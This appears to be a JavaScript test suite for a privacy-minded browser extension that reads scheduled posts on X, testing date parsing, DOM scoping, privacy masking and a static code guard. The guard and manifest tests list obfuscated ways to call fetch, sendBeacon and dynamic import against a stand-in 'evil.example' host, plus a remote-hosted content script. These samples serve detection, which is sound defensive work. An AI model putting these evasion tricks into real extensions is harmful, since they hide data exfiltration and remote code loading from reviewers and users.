import { test } from "node:test";
import assert from "node:assert/strict";
import { parseHTML } from "linkedom";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { runNode } from "../scripts/test-cli.mjs";
import { scanSource, checkManifest, checkProbeDir, attackSelfTest } from "../scripts/verify.mjs";
import { allowedRequest, hasExtensionInitiator } from "../scripts/network-policy.mjs";
await import("../probe/reader.js");
const R = globalThis.XSCHED_READER;
const path = "/compose/post/unsent/scheduled";
const doc = (html) => parseHTML(html).document;
const snap = (html, pathname = path) => R.readSnapshot(doc(html), { pathname });
const phrase = "Will send on Oct 10, 2026 at 9:00 AM";
const row = (body = "fake body") => `<div data-testid="cellInnerDiv"><div role="button" aria-label="${phrase} ${body}"><span>${phrase}</span><span data-testid="tweetText">${body}</span></div></div>`;
const goodManifest = { manifest_version: 3, content_scripts: [{ matches: ["https://x.com/*"], js: ["ok.js"] }] };

test("privacy self-test actually fails when skeleton or time masking leaks", () => {
  assert.doesNotThrow(() => attackSelfTest());
  const S = globalThis.XSCHED_SKELETON;
  assert.throws(() => attackSelfTest(R, { ...S, buildSkeleton: () => 'https://example.com/a?b=c' }), /leaked/);
  assert.throws(() => attackSelfTest({ ...R, maskSample: (text) => text }, S), /unmasked|kept content/);
  assert.throws(() => attackSelfTest({ ...R, buildDiagnostic: () => 'lang=VibeEyeX doclang=VibeEyeX' }, S), /language tags/);
  assert.throws(() => attackSelfTest(R, { ...S, hostnameOf: () => 'privateuser' }), /iframe/);
});

test("network policy rejects same-URL fetches, extension initiators, and external assets", () => {
  const url = "https://x.com/compose/post/unsent/scheduled?fixture=en";
  const navigations = new Set([url]);
  assert.equal(allowedRequest({ url, type: "Document", navigation: true }, navigations), true);
  for (const request of [
    { url, type: "Fetch", navigation: false },
    { url, type: "Document", navigation: true, extensionInitiator: true },
    { url: "https://x.com/favicon.ico", type: "Fetch", navigation: false },
    { url: "https://evil.example/a.png", type: "Image", navigation: false },
    { url: "chrome-extension://id/data", type: "Other", navigation: false },
  ]) assert.equal(allowedRequest(request, navigations), false);
  assert.equal(hasExtensionInitiator({ stack: { callFrames: [], parent: { callFrames: [{ url: "chrome-extension://id/content.js" }] } } }), true);
});

test("meridiem and 24-hour boundaries across all five languages, including noon", () => {
  const cases = [
    ["Will send on Dec 31, 2026 at 12:00 AM x", 0],
    ["Will send on Jan 1, 2027 at 12:00 PM x", 12],
    ["Will send on Jan 1, 2027 at 23:59 x", 23],
    ["2027年1月1日の午前12:00に送信されます 本文", 0],
    ["2027年1月1日の午後12:00に送信されます 本文", 12],
    ["2027년 1월 1일 오전 12:00에 전송됩니다 본문", 0],
    ["2027년 1월 1일 오후 12:00에 전송됩니다 본문", 12],
    ["將於2027年1月1日 上午12:00傳送 本文", 0],
    ["将于2027年1月1日 下午12:00发送 本文", 12],
    ["將於2027年1月1日 晚上8:00傳送 本文", 20],
    ["将于2027年1月1日 中午1:00发送 本文", 13],
  ];
  for (const [text, hour] of cases) {
    const result = R.parseSchedule(text);
    assert.equal(result.at?.getHours(), hour, text);
    assert.equal(result.at.getFullYear(), text.includes("2026") ? 2026 : 2027);
    assert.equal(result.at.getSeconds(), 0);
  }
});

test("invalid meridiem hours and impossible dates never roll into guessed dates", () => {
  for (const text of [
    "Will send on Oct 10, 2026 at 0:00 AM x", "Will send on Oct 10, 2026 at 13:00 AM x",
    "Will send on Oct 10, 2026 at 24:00 x", "Will send on Oct 10, 2026 at 9:60 AM x",
    "Will send on Oct 10, 2026 at 9:000 AM x", "Will send on Oct 10, 2026 at 9:00:30 AM x",
    "2026年1月1日の午前13:00に送信されます 本文",
    "2026년 1월 1일 오전 13:00에 전송됩니다 본문",
    "將於2026年2月29日 上午9:00傳送 本文", "将于2026年4月31日 下午9:00发送 本文",
  ]) {
    const result = R.parseSchedule(text);
    assert.equal(result?.at, null, text);
    assert.equal(result.unparsed, true);
  }
  assert.ok(R.parseSchedule("Will send on Feb 29, 2028 at 9:00 AM x").at);
});

test("loose date-only accessible label uses the entire separate text as body", () => {
  const report = snap('<div role="dialog"><div role="button" aria-label="Oct 10, 2026 at 09:00">A fake body without a date</div></div>');
  assert.equal(report.items.length, 1);
  assert.equal(report.items[0].preview, "A fake body without ");
  assert.equal(report.items[0].tier, "loose");
});

test("at uses the process local timezone and refuses a DST gap", () => {
  const result = runNode(["--input-type=module", "-e", `
    import './probe/reader.js';
    const R = globalThis.XSCHED_READER;
    const local = R.parseSchedule('Will send on Jan 1, 2027 at 9:00 AM x').at;
    const gap = R.parseSchedule('Will send on Mar 14, 2027 at 2:30 AM x');
    if(local.toISOString() !== '2027-01-01T14:00:00.000Z' || gap.at !== null) process.exit(1);
  `], { env: { ...process.env, TZ: "America/New_York" }, timeout: 10000 });
  assert.equal(result.status, 0, result.stderr?.toString());
});

test("home, drafts, and picker reject even a selected Scheduled tab", () => {
  const html = `<div role="dialog"><div role="tab" aria-selected="true">Scheduled</div>${row()}</div>`;
  for (const pathname of ["/home", "/compose/post/unsent/drafts", "/compose/post/schedule", "/foo/compose/post/unsent/scheduled"]) {
    assert.equal(snap(html, pathname).items.length, 0, pathname);
    assert.equal(snap(html, pathname).onScheduled, 0, pathname);
  }
  const drafts = `<div role="dialog"><div role="tab" aria-selected="false">Scheduled</div><div role="tab" aria-selected="true">Drafts</div>${row()}</div>`;
  assert.equal(snap(drafts).items.length, 0);
});

test("composer chip, hidden rows, and nested picker are excluded on Scheduled", () => {
  const html = `<div role="dialog"><div role="tab" aria-selected="true">Scheduled</div>
    <form><div role="button">${phrase}</div></form>
    <div data-testid="scheduleChip">${phrase}</div>
    <div role="button">${phrase}</div>
    <div contenteditable="true">${phrase} body</div>
    <div hidden>${row()}</div><div role="dialog">${row()}</div>${row("real fake row")}</div>`;
  assert.equal(snap(html).items.length, 1);
  assert.equal(snap(html).items[0].preview, "real fake row");
});

test("large list retains all 1000 distinct rows with nested cells", () => {
  const html = `<div role="dialog">${Array.from({ length: 1000 }, (_, index) => row(`fake row ${index}`)).join("")}</div>`;
  const report = snap(html);
  assert.equal(report.items.length, 1000);
  assert.equal(report.timeOk, 1000);
});

test("aria-controls scope and selected tab's dialog exclude unrelated dialogs", () => {
  const html = `<div role="dialog">${row("wrong dialog")}</div>
    <div role="dialog"><div role="tab" aria-selected="true" aria-controls="panel">Scheduled</div><div id="panel">${row("correct row")}</div></div>`;
  assert.equal(snap(html).items[0].preview, "correct row");
  assert.equal(snap(html.replace(' aria-controls="panel"', "")).items[0].preview, "correct row");
});

test("partial cell revision retains role-only rows; no double-counting nested roles", () => {
  const html = `<div role="dialog">${row("cell body")}<div role="listitem"><div role="button" aria-label="${phrase} different body">${phrase} different body</div></div></div>`;
  assert.equal(snap(html).items.length, 2);
});

test("same time and same first 20 code points retain distinct bodies", () => {
  const prefix = "😀".repeat(20);
  const result = snap(`<div role="dialog">${row(prefix + "A")}${row(prefix + "B")}</div>`);
  assert.equal(result.items.length, 2);
  assert.equal(result.items[0].preview, prefix);
  assert.notEqual(result.items[0].key, result.items[1].key);
  assert.equal(R.mergeItems(result.items, result.items).length, 2);
});

test("diagnostic accepts only safe nonnegative integers and numeric enum codes", () => {
  const secret = "@private https://private.example/ Oct 10 2026 9:00 AM private post";
  const report = Object.fromEntries(["onScheduled", "tab", "scope", "cell", "button", "listitem", "link", "tweetText", "phrase", "l1", "l2", "l3", "layer", "mounted", "timeOk", "timeFail", "unparsed", "loose", "needsScroll", "virtualized", "empty", "scrolled"].map((key) => [key, secret]));
  const diagnostic = R.buildDiagnostic(report);
  assert.match(diagnostic, /^xsched probe v0\.0\.3 \(manifest unknown\)\n(?:\w+=[\w%|-]* ?)+$/);
  assert.ok(!diagnostic.includes(secret));
  for (const value of [-1, NaN, Infinity, 1.5, {}, () => secret]) {
    assert.match(R.buildDiagnostic({ cell: value }), /cell=0 /);
  }
  for (const value of ["constructor", "toString", "__proto__", { toString: () => secret }]) {
    assert.match(R.buildDiagnostic({ layer: value, scope: value }), /scope=0 .*layer=0 /);
  }
});

test("guard rejects common aliases, comments, concatenations, and escaped names", () => {
  for (const source of [
    "fetch/*comment*/('x')", "globalThis.fetch", 'window["fe" + "tch"]("x")',
    'const url="https://evil.example/"; window["fe"+"tch"](url)',
    'navigator["sendBeacon"]("x")', 'document["write"]("x")',
    'window["\\u0066etch"]("x")', 'window.f\\u0065tch("x")',
    'history/*comment*/.pushState({}, "", "/home")', 'new/*comment*/Function("x")',
    'import("https://evil.example/m.js")', 'chrome["storage"].local.set({})',
  ]) assert.ok(scanSource(source, "test").length, source);
});

test("minimal manifest rejects permissions, background, main world, and remote code", () => {
  for (const extra of [{ permissions: [] }, { optional_permissions: [] }, { background: { service_worker: "worker.js" } }, { web_accessible_resources: [] }, { externally_connectable: {} }]) {
    assert.ok(checkManifest({ ...goodManifest, ...extra }).length);
  }
  for (const entry of [{ matches: "https://x.com/*", js: ["ok.js"] }, { matches: ["https://x.com/*"], js: ["https://evil.example/a.js"] }, { matches: ["https://x.com/*"], js: ["ok.js"], world: "MAIN" }]) {
    assert.ok(checkManifest({ ...goodManifest, content_scripts: [entry] }).length);
  }
});

test("verify CLI exits nonzero for an actual synthetic violation; missing manifest fails", () => {
  const directory = mkdtempSync(join(tmpdir(), "xsched-review-"));
  try {
    assert.ok(checkProbeDir(directory).errors.length);
    writeFileSync(join(directory, "manifest.json"), JSON.stringify(goodManifest));
    writeFileSync(join(directory, "ok.js"), 'window["fe" + "tch"]("x");');
    const result = runNode(["scripts/verify.mjs", directory], { timeout: 10000 });
    assert.equal(result.status, 1, result.stdout.toString() + result.stderr.toString());
    assert.match(result.stderr.toString(), /banned API/);
  } finally { rmSync(directory, { recursive: true, force: true }); }
});
